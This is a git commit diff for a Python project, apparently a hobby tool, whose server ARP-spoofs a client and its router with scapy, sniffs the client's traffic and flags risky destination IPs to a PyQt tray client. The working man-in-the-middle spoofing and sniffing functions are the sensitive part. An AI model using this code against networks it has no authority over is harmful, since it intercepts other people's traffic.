90b50625e7c4ff483e65c86b48615c01e7fb9848
Damotorie <parksjin01@gmail.com>
2016-10-02 18:13:03 +0900

    almost finished

--- File for client.py
+++ File for client.py
@@ -1,14 +1,44 @@
+#모듈호출 부분
 import socket
+from PyQt4 import QtGui, QtCore
+import sys
 
+#팝업을 띄우기 위한 클래스 생성
+class SystemTrayIcon(QtGui.QSystemTrayIcon):
+    def __init__(self, parent=None):
+        QtGui.QSystemTrayIcon.__init__(self, parent)
+        self.setIcon(QtGui.QIcon('myicon.png'))
+
+        self.menu = QtGui.QMenu(parent)
+        exitAction = self.menu.addAction("Exit")
+        exitAction.triggered.connect(self.exitActionFunc)
+        self.setContextMenu(self.menu)
+
+    def exitActionFunc(self):
+        #recover function here
+        sys.exit()
+
+    def warn(self, ip_address):
+        self.showMessage("Warning","%s is dangerous, Don't go there!" %ip_address)
+
+#라우터 IP를 입력받는다.
 def select_victim():
     router_ip=raw_input('Input router IP')
     return router_ip
 
+#클라이언트용 소켓을 생성하여 서버와 통신한다.
 sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 router_addr=select_victim()
 sock.connect(('192.168.0.2', 9875))
 sock.sendall(router_addr)
+
+#서버에서 받은 위험한 ip 정보를 팝업의 형태로 띄워준다.
+app = QtGui.QApplication([])
+tray = SystemTrayIcon()
+QtGui.QSystemTrayIcon.show(tray)
 while True:
     a=sock.recv(20)
     if a:
-        print a
+        tray.warn(a)
+
+app.exec_()
--- backup.py
+++ backup.py
@@ -1,3 +1,4 @@
+#모듈호출 부분
 import subprocess
 import scapy.all
 import time
@@ -6,7 +7,10 @@ import urllib2
 import BeautifulSoup
 import socket
 import multiprocessing
+import sys
+import os
 
+#필요한 전역변수 선언부분
 attacker_ip='192.9.13.229'
 sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 contents=''
@@ -14,6 +18,9 @@ victim_ip=''
 router_ip=''
 client=''
 
+#목적지 ip가 안전한지 아닌지 검사하는 함수이다
+#검사하고자 하는 ip를 매개변수로 받아 위험한 ip라고 판단되면 클라이언트 프로그램에 ip주소를 보낸다
+#검사를 하는 방법은 https://sitecheck.sucuri.net 웹사이트를 이용했다 웹 개발자들에게 감사를 표시하고 싶다.
 def checking_ip(ip_address):
     scores={'Low Risk':1, 'Medium Risk':2, 'High Risk':5}
     score_sum=0
@@ -31,12 +38,14 @@ def checking_ip(ip_address):
             score_sum+=scores[result[i*4+2].text]
         except:
             score_sum+=10
+    #이 아래의 조건문으로 얼마나 검사를 타이트하게 진행할 것인지 정할 수 있다
     if score_sum > 5:
         client.send(ip_address)
         with open('test.txt', 'a') as f:
             f.write(ip_address+' ')
         contents.append(ip_address)
 
+#ip를 매개변수로 입력받으면 mac 어드레스로 돌려준다.
 def getMac(host):
     a=subprocess.Popen(["arp", "-a"], stdout=subprocess.PIPE)
     a=a.stdout.read().split('\n')[:-1]
@@ -45,18 +54,24 @@ def getMac(host):
         if host in tmp[1]:
             return tmp[3]
 
+#attack에 해당하는 함수이다 이는 mitm 공격을 수행한다.
+#이 함수를 반복적으로 실행함으로써 라우터와 피해자의 mac을 속을수 있다.
 def attack(victim_ip, router_ip):
     victim_mac=getMac(victim_ip)
     router_mac=getMac(router_ip)
     scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac))
     scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac))
 
+#recover에 해당하는 함수이다 이는 mitm 공격을 종료한다
+#이 함수를 실행함으로써 라우터와 피해자 mac을 원래대로 돌릴수 있다
 def recover(victim_ip, router_ip):
     victim_mac=getMac(victim_ip)
     router_mac=getMac(router_ip)
     scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=3)
     scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=router_mac), count=3)
 
+#scapy의 sniff가 발생할때 콜백함수의 형태로 작동하는 함수이다.
+#ip의 위험한 정도를 체크하는 함수인 checking_ip를 호출한다.
 def pr(x):
     if x.haslayer('IP') and x['IP'].src == victim_ip:
         print x['IP'].dst
@@ -65,15 +80,15 @@ def pr(x):
 def sniffing(clients, victim_ip, contents):
     scapy.all.sniff(prn=pr)
 
+#가장 처음 호출되는 함수이다
+#mitm을 수행하는 무한루프를 가지고 있으며 sniff를 위해 스레드를 하나 추가로 생성한다.
+#리눅스에서 root권한(관리자 권한)을 가지고 실행시켜야 한다
 def main(client, client_address):
-    #if os.geteuid() != 0:
-    #    sys.exit("[!] Please run as root")
+    if os.geteuid() != 0:
+        sys.exit("[!] Please run as root")
     victim_ip=client_address[0]
     router_ip=client.recv(1024)
     print victim_ip, router_ip
-    with open('test.txt', 'r') as f:
-        contents=f.readline()
-    contents=contents.split(' ')
     if getMac(router_ip) == None:
         print 'We can not find router mac address'
         return
